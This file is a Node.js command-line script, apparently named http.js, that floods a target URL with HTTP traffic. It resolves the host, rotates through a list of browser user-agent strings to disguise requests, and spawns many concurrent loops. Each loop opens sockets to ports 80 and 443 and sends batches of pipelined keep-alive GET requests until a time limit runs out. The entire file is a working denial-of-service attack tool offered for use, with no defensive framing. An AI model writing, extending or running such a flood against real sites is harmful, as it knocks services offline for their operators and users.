const net = require('net');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const { v4: uuidv4 } = require('uuid');
const dns = require('dns');

const userAgents = [
    // Desktop User Agents
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    
    // Mobile User Agents
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",

    // Other User Agents
    "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P Build/OPR6.170623.013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Nexus 6 Build/NBD92G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5X Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    
    // Additional User Agents
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LMY48M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/ 5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 Build/OOP27.911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-F926B Build/SKQ1.210828.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TKQ1.220826.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
];

const method = "GET"; // Define the HTTP method

async function getResolvedIP(hostname) {
    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) reject(err);
            else resolve(address);
        });
    });
}

async function sender(max, url, time) {
    const { hostname } = new URL(url);
    let ip;
    try {
        ip = await getResolvedIP(hostname);
    } catch (err) {
        console.error("DNS FAILED:", err);
        return;
    }

    const end_time = time ? Date.now() + time * 1000 : undefined;

    while (!end_time || Date.now() < end_time) {
        let packet = "";
        const ports = [80, 443];
        let sock;

        for (const port of ports) {
            try {
                sock = new net.Socket();
                await new Promise((resolve, reject) => {
                    sock.connect(port, ip, () => {
                        resolve();
                    });
                    sock.on('error', (err) => {
                        reject(err);
                    });
                });
                break;
            } catch (err) {
                console.log("\n[CONNECT-ERROR] Unable to connect:", err.message, "\n");
                sock.destroy();
            }
        }

        if (!sock) {
            continue;
        }

        for (let i = 0; i < max; i++) {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            if (!userAgent) {
                console.log("[ERROR] NO AGENTS FOUND");
                break;
            }

            packet += `${method} / HTTP/1.1\r\nHost: ${hostname}\r\nUser -Agent: ${userAgent}\r\nConnection: keep-alive\r\n\r\n`;
        }

        sock.write(packet);
        sock.end(); // Close the socket after sending the packet
    }
}

async function layer7(url, max, time) {
    const { hostname } = new URL(url);
    let ip;
    try {
        ip = await getResolvedIP(hostname);
    } catch (err) {
        console.error("DNS FAILED:", err);
        return;
    }

    for (let v = 0; v < max; v++) {
        sender(max, url, time);
    }

    if (time) setTimeout(() => {}, time * 1000);
}

const args = process.argv.slice(2);
if (args.length >= 3) {
    const [url, max, time] = args;
    layer7(url, max, time);
} else {
    console.log("Usage: node http.js [url] [threads] [time]");
}
